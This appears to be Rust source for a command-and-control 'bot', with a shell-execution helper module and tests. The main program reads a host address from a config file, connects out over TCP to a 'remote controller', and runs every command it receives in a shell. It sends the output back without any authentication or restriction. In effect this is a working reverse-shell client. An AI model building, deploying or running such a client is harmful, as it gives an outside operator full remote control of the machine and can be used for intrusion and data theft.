use std::process::{Command, Output};
use std::io;

/// Executes an arbitrary system command and returns the output
/// 
/// # Arguments
/// * `command` - The command to execute
/// * `args` - Arguments to pass to the command
///
/// # Returns
/// * `Result<Output, io::Error>` - The command output or an error
pub fn execute_command(command: &str, args: &[&str]) -> io::Result<Output> {
    Command::new(command)
        .args(args)
        .output()
}

/// Executes a shell command string and returns the output
///
/// # Arguments
/// * `cmd_string` - The full command string to execute (e.g., "ls -la /tmp")
///
/// # Returns
/// * `Result<Output, io::Error>` - The command output or an error
pub fn execute_shell_command(cmd_string: &str) -> io::Result<Output> {
    #[cfg(target_os = "windows")]
    {
        Command::new("cmd")
            .args(&["/C", cmd_string])
            .output()
    }

    #[cfg(not(target_os = "windows"))]
    {
        Command::new("sh")
            .args(&["-c", cmd_string])
            .output()
    }
}

/// Executes a command and returns stdout as a string
///
/// # Arguments
/// * `command` - The command to execute
/// * `args` - Arguments to pass to the command
///
/// # Returns
/// * `Result<String, Box<dyn std::error::Error>>` - The stdout output or an error
pub fn execute_command_to_string(command: &str, args: &[&str]) -> Result<String, Box<dyn std::error::Error>> {
    let output = execute_command(command, args)?;

    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        return Err(format!("Command failed: {}", stderr).into());
    }

    Ok(String::from_utf8(output.stdout)?)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_execute_command() {
        #[cfg(target_os = "windows")]
        let result = execute_command("cmd", &["/C", "echo test"]);

        #[cfg(not(target_os = "windows"))]
        let result = execute_command("echo", &["test"]);

        assert!(result.is_ok());
        let output = result.unwrap();
        assert!(output.status.success());
    }

    #[test]
    fn test_execute_shell_command() {
        let result = execute_shell_command("echo hello");
        assert!(result.is_ok());
        let output = result.unwrap();
        assert!(output.status.success());
    }
}

mod executor;

use std::io::{Read, Write};
use std::net::TcpStream;
use std::fs;
use std::path::Path;

/// Configuration structure for the bot
struct BotConfig {
    host_address: String,
}

impl BotConfig {
    /// Load configuration from the network.cfg file
    fn load(config_path: &str) -> Result<Self, Box<dyn std::error::Error>> {
        let content = fs::read_to_string(config_path)?;

        let host_address = content
            .lines()
            .find(|line| line.starts_with("host_address="))
            .and_then(|line| line.split('=').nth(1))
            .map(|s| s.trim().to_string())
            .ok_or("host_address not found in config")?;

        Ok(BotConfig { host_address })
    }
}

/// Main bot structure
struct Bot {
    config: BotConfig,
}

impl Bot {
    /// Create a new bot instance
    fn new(config: BotConfig) -> Self {
        Bot { config }
    }

    /// Connect to the remote controller and start the command loop
    fn run(&self) -> Result<(), Box<dyn std::error::Error>> {
        println!("[*] Bot starting...");
        println!("[*] Connecting to remote controller at {}", self.config.host_address);

        let mut stream = TcpStream::connect(&self.config.host_address)?;
        println!("[+] Connected to remote controller");

        // Send initial handshake
        stream.write_all(b"BOT_READY\n")?;

        let mut buffer = [0; 4096];

        loop {
            // Read command from remote controller
            match stream.read(&mut buffer) {
                Ok(0) => {
                    println!("[*] Connection closed by remote controller");
                    break;
                }
                Ok(n) => {
                    let command_str = String::from_utf8_lossy(&buffer[..n]);
                    let command = command_str.trim();

                    if command.is_empty() {
                        continue;
                    }

                    println!("[*] Received command: {}", command);

                    // Handle special commands
                    match command {
                        "EXIT" | "QUIT" => {
                            println!("[*] Received exit command");
                            stream.write_all(b"BOT_EXITING\n")?;
                            break;
                        }
                        "PING" => {
                            println!("[*] Responding to PING");
                            stream.write_all(b"PONG\n")?;
                        }
                        _ => {
                            // Execute the command
                            match self.execute_and_return(command, &mut stream) {
                                Ok(_) => {
                                    println!("[+] Command executed successfully");
                                }
                                Err(e) => {
                                    println!("[-] Error executing command: {}", e);
                                    let error_msg = format!("ERROR: {}\n", e);
                                    let _ = stream.write_all(error_msg.as_bytes());
                                }
                            }
                        }
                    }
                }
                Err(e) => {
                    println!("[-] Error reading from socket: {}", e);
                    break;
                }
            }
        }

        println!("[*] Bot shutting down");
        Ok(())
    }

    /// Execute a command and send results back to the controller
    fn execute_and_return(&self, command: &str, stream: &mut TcpStream) -> Result<(), Box<dyn std::error::Error>> {
        println!("[*] Executing: {}", command);

        // Execute the shell command
        let output = executor::execute_shell_command(command)?;

        // Prepare response
        let stdout = String::from_utf8_lossy(&output.stdout);
        let stderr = String::from_utf8_lossy(&output.stderr);
        let status_code = output.status.code().unwrap_or(-1);

        // Format and send response
        let response = format!(
            "RESULT:{}\nSTDOUT:\n{}\nSTDERR:\n{}\nSTATUS:{}\nEND_RESULT\n",
            command, stdout, stderr, status_code
        );

        stream.write_all(response.as_bytes())?;
        stream.flush()?;

        Ok(())
    }
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Determine config path
    let config_path = if Path::new("config/network.cfg").exists() {
        "config/network.cfg"
    } else if Path::new("workspace/config/network.cfg").exists() {
        "workspace/config/network.cfg"
    } else {
        return Err("Configuration file not found".into());
    };

    println!("[*] Loading configuration from: {}", config_path);

    // Load configuration
    let config = BotConfig::load(config_path)?;

    // Create and run bot
    let bot = Bot::new(config);
    bot.run()?;

    Ok(())
}

